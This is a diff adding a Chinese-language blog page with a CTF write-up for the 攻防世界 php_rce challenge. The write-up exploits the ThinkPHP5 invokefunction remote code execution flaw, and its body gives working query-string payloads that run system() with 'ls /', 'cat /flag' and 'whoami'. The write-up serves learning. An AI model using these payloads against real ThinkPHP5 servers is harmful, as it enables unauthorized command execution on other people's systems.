@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>web2 | qin</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="Thinkphp5 &#x3D;&#x3D;攻防世界php_rce&#x3D;&#x3D;: 进入题目环境，页面如下：  可能存在ThinkPHP5版本框架的漏洞。构造payload: s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1]&#x3D;ls &#x2F;  在根目">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web2">
+<meta property="og:url" content="https://qin456486.github.io/2025/01/18/web2/index.html">
+<meta property="og:site_name" content="qin">
+<meta property="og:description" content="Thinkphp5 &#x3D;&#x3D;攻防世界php_rce&#x3D;&#x3D;: 进入题目环境，页面如下：  可能存在ThinkPHP5版本框架的漏洞。构造payload: s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1]&#x3D;ls &#x2F;  在根目">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://qin456486.github.io/$%7Bfiilename%7D/QQ20250117-200433.png">
+<meta property="og:image" content="https://qin456486.github.io/$%7Bfiilename%7D/QQ20250118-135127.png">
+<meta property="og:image" content="https://qin456486.github.io/$%7Bfiilename%7D/QQ20250118-140114.png">
+<meta property="og:image" content="https://qin456486.github.io/$%7Bfiilename%7D/QQ20250118-140431.png">
+<meta property="article:published_time" content="2025-01-18T05:15:41.000Z">
+<meta property="article:modified_time" content="2025-01-18T06:23:42.725Z">
+<meta property="article:author" content="qin456486">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://qin456486.github.io/$%7Bfiilename%7D/QQ20250117-200433.png">
+  
+    <link rel="alternate" href="/atom.xml" title="qin" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">qin</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://qin456486.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-web2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/01/18/web2/" class="article-date">
+  <time class="dt-published" datetime="2025-01-18T05:15:41.000Z" itemprop="datePublished">2025-01-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      web2
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong>Thinkphp5</strong></p>
+<p>&#x3D;&#x3D;攻防世界php_rce&#x3D;&#x3D;:</p>
+<p>进入题目环境，页面如下：</p>
+<p><img src="/$%7Bfiilename%7D/QQ20250117-200433.png"></p>
+<p>可能存在ThinkPHP5版本框架的漏洞。构造payload: <code>s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1]=ls /</code></p>
+<p><img src="/$%7Bfiilename%7D/QQ20250118-135127.png"></p>
+<p>在根目录下看到flag,构造payload进入flag目录，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls /flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="/$%7Bfiilename%7D/QQ20250118-140114.png"></p>
+<p>用cat命令查看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1]=cat /flag</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="/$%7Bfiilename%7D/QQ20250118-140431.png"></p>
+<p>&#x3D;&#x3D;总结&#x3D;&#x3D;：1.构造过程中用到的call_user_func_array()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array(参数一，参数二)：</span><br><span class="line">参数一：表示一个回调函数。</span><br><span class="line">参数二：表示传递给这个回调函数的参数，参数二的数据类型为数组。</span><br><span class="line">如果回调函数成功执行，则返回执行结果，否则返回False值.</span><br></pre></td></tr></table></figure>
+
+<p>2.ThinkPHP5 invokeFunction漏洞:</p>
+<p>漏洞payload      <code>s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</code></p>
+<p>s参数是thinkphp的一种路由形式,这里传入的函数是call_user_func_array<br>参数是[system,[whoami]],call_user_func_array第一个参数是函数名，第二个参数也是数组.</p>
+<p>&#x3D;&#x3D;参考&#x3D;&#x3D;：<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/303908.html">https://www.freebuf.com/vuls/303908.html</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://qin456486.github.io/2025/01/18/web2/" data-id="cm61szo2u0000e4v33jzf6r1e" data-title="web2" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2025/01/17/web1/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">web1</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/01/">January 2025</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/01/18/web2/">web2</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/17/web1/">web1</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/12/%E7%AC%AC%E4%B8%80%E5%91%A8/">第一周</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/12/my-fist-blog/">第一个博客</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/11/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 qin456486<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
